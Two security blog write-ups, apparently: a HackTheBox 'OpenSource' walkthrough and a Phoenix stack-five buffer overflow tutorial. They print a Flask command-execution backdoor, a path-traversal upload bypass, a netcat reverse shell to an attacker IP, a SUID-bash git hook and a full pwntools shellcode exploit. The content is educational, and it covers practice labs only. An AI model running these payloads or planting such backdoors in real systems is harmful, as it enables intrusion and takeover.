[{"categories":["HTB","Machines"],"content":" Summary This machine’s theme is that it is an opensource file transfer app, where one user can upload a file and they would get a URL they can share with others to download. Vulnrabilites in the code made it possible for an attacker to upload a backdoor and get command execution on a Docker container. Where the attacker could then pivot to a filtered Gitea service and log in to one of the users using found credentials in a previous commit in the git repository. Privilage escaltion revolves around a custom script ran as root to commit and push the home directory of the comprised user, that can be exploited by adding a malicious pre-commit hook. Enumration ","date":"0001-01-01","objectID":"/htb-opensource/:0:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Port scanning nmap -sC -sV -o nmap/basic 10.10.11.164 Port 80 and port 22 are open which are just ssh and http, but there is another port 3000 that is filtered by a firewall. Website running in development mode with python debugger Werkzeug/2.1.2 That means we could access /console for code execution if we knew the pincode.. or generated it. Werkzeug Pin code generation is possible but we are gonna need access to files on the machine. ","date":"0001-01-01","objectID":"/htb-opensource/:1:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Website Web page promoting their open source file sharing app. We have the option to download the source code and another option to go to the running app in /upcloud App has upload functionality. possible LFI? ","date":"0001-01-01","objectID":"/htb-opensource/:2:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Git commits Since this is a git repo we can check for any sensitive files or secrets that were commited previously. A good tool for this is gitkraken . Found creds in a previous commit in the dev branch dev01:Soulless_Developer#2022 { \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\", \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\", \"http.proxyStrictSSL\": false } Found in .vscode/settings.json commit: a76f8f75f7a4a12b706b0cf9c983796fa1985820 In the dev branch. ","date":"0001-01-01","objectID":"/htb-opensource/:3:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Testing for local file inclusion (LFI) Uploading a file stores it in /uploads/{FILE} Tried navigating to /uploads/../../../../etc/passwd but it gets filtered Since we have the source code we can see how it is being filtered. def get_file_name(unsafe_filename): return recursive_replace(unsafe_filename, \"../\", \"\") This function sanitizes the file name from the users post request (uploading a file). We can see that it only filters ../ And if we check out how the path is constructed in views.py. We see that it just uses os.path.join() @app.route('/upcloud', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) # Vulnerable line f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html') And that is vulnerable because, if we looked at how os.path.join() works We can see that if we add a / to any argument it will ignore all the arguments that came before and start from the argument that starts with /. So that means we could control the file path and bypass the LFI filter by just adding a / making it an absolute path. curl http://opensource.htb/uploads/..%2f%2fetc/passwd This does return /etc/passwd from the target machine. Using this LFI I have tried generating the werkzueg pin code but I could not get that to work. Foothold Found some cronjob, but there are no executable scripts to modify. We have file read and file upload so what is stopping us from changing the source code on the server to add our own vulnerable code to get RCE import os ... @app.route('/vymvn', methods=['POST']) def shell(): cmd = request.form['text'] processed_cmd = os.system(cmd) return processed_cmd added this function to views.py which will take any data we send with as POST request and process it as a command and send it back. Basically making ourselves a backdoor. Now we need to upload views.py but uploading it normally will place it in /uploads and that would be useless. We can intercept the upload request with burpsuite and use the same method we used to bypass LFI filter to navigate to /app/app/views.py ","date":"0001-01-01","objectID":"/htb-opensource/:4:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Testing RCE Sending a POST request to /vymvn using curl: curl -X POST http://opensource.htb/vymvn -d \"text=id\" We have RCE! as root? ","date":"0001-01-01","objectID":"/htb-opensource/:5:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Getting a reverse shell Setting up listener: nc -lvnp 6666 Sending reverse shell command: curl -X POST --data \"text=nc 10.10.14.27 6666 -e /bin/ash\" opensource.htb/vymvn We know the shell is /bin/ash from the /etc/passwd file we got previously. {: .prompt-tip } After exploring the machine we can quickly realize that we are in a Docker container. ","date":"0001-01-01","objectID":"/htb-opensource/:6:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Network enumration The docker instance runs on its own interface (probably docker0) The docker interface has the network ip 172.17.0 Wrote a quick shell script to ping sweep the network and see who is up. #!/bin/bash for host in $(seq 0 255); do ping -c 1 172.17.0.$host | grep \"bytes from\" | cut -d \" \" -f 4 \u0026 done We can see hosts from .1 to .9 are up. Wrote another script to scan the ports on these hosts. #!/bin/bash NETWORK=$1 for host in $(seq 1 9) do for port in $(seq 1 4000) do r=$(nc -zv -w 1 $NETWORK.$host $port) if [[ $r == *\"succeeded\"* ]]; then echo $r fi done done The output: 172.17.0.1 (172.17.0.1:22) open 172.17.0.1 (172.17.0.1:80) open 172.17.0.1 (172.17.0.1:3000) open 172.17.0.2 (172.17.0.2:80) open 172.17.0.3 (172.17.0.3:80) open 172.17.0.4 (172.17.0.4:80) open 172.17.0.5 (172.17.0.5:80) open 172.17.0.6 (172.17.0.6:80) open 172.17.0.7 (172.17.0.7:80) open 172.17.0.8 (172.17.0.8:80) open 172.17.0.9 (172.17.0.9:80) open Since 172.17.0.1 is the network gateway and the ports open on it match the ports in the nmap scan we can confirm that it is the host machine. Port 3000 is running an HTTP server and we can connect to it from the docker container because it is inside the network and not filtered by a firewall. Now we can port forward/tunnel port 3000 to our machine and access it with the browser. ","date":"0001-01-01","objectID":"/htb-opensource/:7:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Tunneling in Found tunneling tool chisel which allowed me to create a tunnel to 172.17.0.1:3000 with reverse port forwarding. This was done by: Starting a chisel server on attack machine: chisel server --reverse --port 9999 Connecting from victim machine chisel client 10.10.14.57:9999 R:3000:172.17.0.1:3000 And now I could access port 3000 on the box by simply going to localhost:3000 on my attacker machine! What happend here is the client connected to the server and forwarded 172.17.0.1:3000 to 10.10.14.57:3000 which is my machine. {: .prompt-info} Navigating to it we find that it is running gitea which is like github but hosted locally. Signing in with the creds found before. We find a backup folder with a private ssh key. Stole that key and connected to user dev01 ssh -i dev01.key dev01@opensource.htb User pwned! Privilege Escalation Googling the version of gitea we are running returns that it is vulnerable to privilege escalation (CVE-2022-30781) but that was a rabbit hole. {: .prompt-tip} ","date":"0001-01-01","objectID":"/htb-opensource/:8:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":["HTB","Machines"],"content":"Checking procceses Dropped pspy and ran for a while to check what proccess are being ran. We can notice that there is a custom script ran by root that is commiting and pushing the home directory of dev01. We can’t modify this script becuase we don’t have write permissions on it. Since the commiting is done by root we can add a pre-commit hook in .git/hooks/pre-commit. We enable this hook by renaming .git/hooks/pre-commit.sample and removing the .sample from the end. Hooks are scripts that run automatically with any git action like commit, push.. etc. {: .prompt-info} The pre-commit script will be executed by root before commiting. Injected chmod +s /bin/bash into .git/hooks/pre-commit which made bash an SUID means it will run bash as root and maintain the UID and GID of root, effectively making us the root user. bash -p Root pwned! ","date":"0001-01-01","objectID":"/htb-opensource/:9:0","tags":["git","LFI","RCE","Docker","Port Forwarding","Tunneling","git hooks"],"title":"OpenSource Writeup","uri":"/htb-opensource/"},{"categories":null,"content":"Introduction Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands. In this blog post, we will explore the basics of buffer overflow attacks and demonstrate how to execute shellcode by solving Stack 5 from Pheonix . Summary This level from Pheonix is a simple 64-bit buffer overflow that requires us to overflow the buffer and overwrite the return pointer to return to some shellcode that we have placed on the stack. Binary analysis One of the first things I do when I have a binary is run file on it $ file ./stack-five ./stack-five: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped From this output we now know that we are working with a 64-bit binary and we also know that it is dynamically linked and is not stripped of the debug symbols, which makes reverse engineering it much easier if we had to. ","date":"0001-01-01","objectID":"/stack5/:0:0","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"},{"categories":null,"content":"Source code Since we are provided with the source code we won’t have to do any disassemling or reverse engineering to figure out how this binary works /* * phoenix/stack-five, by https://exploit.education * * Can you execve(\"/bin/sh\", ...) ? * * What is green and goes to summer camp? A brussel scout. */ #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cunistd.h\u003e #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\" char *gets(char *); void start_level() { char buffer[128]; gets(buffer); } int main(int argc, char **argv) { printf(\"%s\\n\", BANNER); start_level(); } In the comments, we are given a hint that we need to run execve(\"/bin/sh\"), but there is no execve() function being ran anywhere in the source code. And if we check the security measure applied using checksec from pwntools: $ checksec ./stack-five [*] '/opt/phoenix/amd64/stack-five' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments RPATH: '/opt/phoenix/x86_64-linux-musl/lib' We see that NX (No execute from stack) is disabled, as well as all the other security measures. So now it is very obvious that we are going to need to inject our own shellcode. Starting with the main function, it simply prints the banner then calls start_level() which defines a 128 byte buffer and then uses gets() (the dangerous C function) to get user input and stores it in the 128 byte buffer without any checks for the length of the user supplied input whatsoever. ","date":"0001-01-01","objectID":"/stack5/:1:0","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"},{"categories":null,"content":"Running Now that we know what it does, we can run it user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education hello As we saw in the source it just takes input and exits. Now let’s see what happens when we give it a big input user@phoenix-amd64:/opt/phoenix/amd64$ python3 -c \"print('A' * 200)\" | ./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education Segmentation fault A segmentation fault! that means accessed parts of the memory we weren’t supposed to. Finding offset To find the offset I will open the program in GDB and I am using GEF because it comes with useful tools to help with exploit development. GEF also comes pre-installed on the Pheonix machine. gef➤ pattern create 200 [+] Generating a pattern of 200 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa [+] Saved as '$_gef0' gef➤ Using the pattern create command in GEF we can create a pattern that is unique for every 8 bytes, which will make it easy to find. Now we can run the program again and supply this pattern and we find which of the unique 8 bytes from the pattern ended up in rip. gef➤ r Starting program: /opt/phoenix/amd64/stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa Program received signal SIGSEGV, Segmentation fault. The program crashes as expected and GEF has hooks set up to print the registers, stack and instructions. Looking through the resgisters output we see: $rip : 0x6161616161616172 (\"raaaaaaa\"?) The instruction pointer was overwritten with raaaaaaa meaning whatever we place instead of that will be our new rip. Now we use pattern search to find where that is in the pattern string gef➤ pattern search 0x6161616161616172 [+] Searching '0x6161616161616172' [+] Found at offset 136 (little-endian search) likely [+] Found at offset 129 (big-endian search) gef➤ From the binary analysis we know that this binary is little endian so now we know that the offset is 136 Crafting exploit We can now start working on the exploit #!/usr/bin/env python3 from pwn import * # Defining binary bin = context.binary = ELF('./stack-five', checksec=False) p = process(bin.path) context.update(arch=\"amd64\") # The offset and padding we need to overflow the buffer OFFSET = 136 PADDING = b'A' * OFFSET I am using the pwntools library and I create a an ELF binary object, start the proccess which will open the program to interact with with it and I set the architecture. ","date":"0001-01-01","objectID":"/stack5/:2:0","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"},{"categories":null,"content":"Payload Currently our exploit will take us to the address where it will overwrite rip and then just go into the stack. So first part of our payload will be the address to write into rip and then we are going to need a nop slide to make sure we hit our shellcode and then finally, our shellcode. When performing a buffer overflow attack, a NOP slide can help an attacker hit their shellcode by creating a region of uncertainty about the exact location of the code. By inserting a large block of NOP instructions in between the code and the shellcode, an attacker can increase the chances of their shellcode being executed, even if they do not know the exact location of the code they are trying to overwrite. - ChatGPT {: .prompt-info} ","date":"0001-01-01","objectID":"/stack5/:3:0","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"},{"categories":null,"content":"Step 1 - Find stack address I want to make sure I have the stack address at the point where the main function would return. We can do that by first adding a breakpoint at the return instruction of main() in GDB. To see the addresses of the instructions we can disassemble the function: gef➤ disas main Dump of assembler code for function main: 0x00000000004005a4 \u003c+0\u003e: push rbp 0x00000000004005a5 \u003c+1\u003e: mov rbp,rsp 0x00000000004005a8 \u003c+4\u003e: sub rsp,0x10 0x00000000004005ac \u003c+8\u003e: mov DWORD PTR [rbp-0x4],edi 0x00000000004005af \u003c+11\u003e: mov QWORD PTR [rbp-0x10],rsi 0x00000000004005b3 \u003c+15\u003e: mov edi,0x400620 0x00000000004005b8 \u003c+20\u003e: call 0x400400 \u003cputs@plt\u003e 0x00000000004005bd \u003c+25\u003e: mov eax,0x0 0x00000000004005c2 \u003c+30\u003e: call 0x40058d \u003cstart_level\u003e 0x00000000004005c7 \u003c+35\u003e: mov eax,0x0 0x00000000004005cc \u003c+40\u003e: leave 0x00000000004005cd \u003c+41\u003e: ret End of assembler dump. gef➤ b *0x4005cd Breakpoint 1 at 0x4005cd gef➤ The address we are interested in is the last one (ret) which is 0x4005cd we don’t need to grab the extra 0s because pwntools knows it is a 64-bit program and will treat it accordingly. Now we run program normally with normal input and it stops at the breakpoint. From here we use info registers to look at the registers gef➤ info registers ... ... rsp 0x7fffffffebe8 0x7fffffffebe8 ... ... gef➤ This address is the stack address. We can now update that in the exploit. rip = p64(0x7fffffffebe8 + 40) # new rip -\u003e rsp Notice I am also adding + 40 to the address just to make sure we hit our nop slide. {: .prompt-tip} ","date":"0001-01-01","objectID":"/stack5/:3:1","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"},{"categories":null,"content":"Step 2 - nop slide This part is pretty simple. The opcode of a nop instruction is 0x90. We use that as a raw byte in the code as \\x90 nop_slide = b'\\x90' * 100 ","date":"0001-01-01","objectID":"/stack5/:3:2","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"},{"categories":null,"content":"Part 3 - Shellcode For this part we can find shellcode to execute exevce(\"/bin/sh\") for an amd64 linux system online. But I am going to use shellcraft from the pwntools library to generate the shellcode. shellcode = asm(shellcraft.linux.sh()) I did not have to specify architecture becuase I set the context at the start of the script. The output of that line will be be the raw shellcode bytes resturned by asm(). The output of shellcraft.linux.sh() is the assembly code for executing execve(\"/bin/sh\"). Exploiting Now that we have the payload set up, the final exploit will be: #!/usr/bin/env python3 from pwn import * # Defining binary exe = context.binary = ELF('./stack-five', checksec=False) p = process(exe.path) context.update(arch=\"amd64\") # The offset and padding we need to overflow the buffer OFFSET = 136 PADDING = b'A' * OFFSET # Building payload rip = p64(0x7fffffffebe8 + 40) # new rip -\u003e rsp nop_slide = b'\\x90' * 100 shellcode = asm(shellcraft.linux.sh()) # Output from shellcraft will be the assembly code below. using asm() to compile it into raw bytes ''' Shellcode in assembly: /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push b'/bin///sh\\x00' */ push 0x68 mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp /* push argument array ['sh\\x00'] */ /* push b'sh\\x00' */ push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi /* 0 */ push rsi /* null terminate */ push 8 pop rsi add rsi, rsp push rsi /* 'sh\\x00' */ mov rsi, rsp xor edx, edx /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall ''' # Finally, putting them together into one payload payload = PADDING + rip + nop_slide + shellcode # Sending the payload p.sendlineafter(b'education\\n', payload) # Going into interactive mode to interact with new shell p.interactive() We send the payload to the process we opened with p.sendlineafter() to send the payload right after the banner is printed. Then we go into interactive mode to input commands into the new /bin/sh process. user@phoenix-amd64:/opt/phoenix/amd64$ ./solve_stack-five.py [+] Starting local process '/opt/phoenix/amd64/stack-five': pid 1219 [*] Switching to interactive mode $ id uid=1000(user) gid=1000(user) groups=1000(user),27(sudo) Success! Mitigation This exploit would not have been possible if Address space layout randomization (ASLR) was enabled on this machine and the program was compiled with the NX bit enabled which disables any code execution from the stack. Since this is a VM made for exploit education, those mitigations were turned off but in a real world scenario they should always be enabled. ","date":"0001-01-01","objectID":"/stack5/:3:3","tags":null,"title":"Simple 64-bit buffer overflow with shellcode","uri":"/stack5/"}]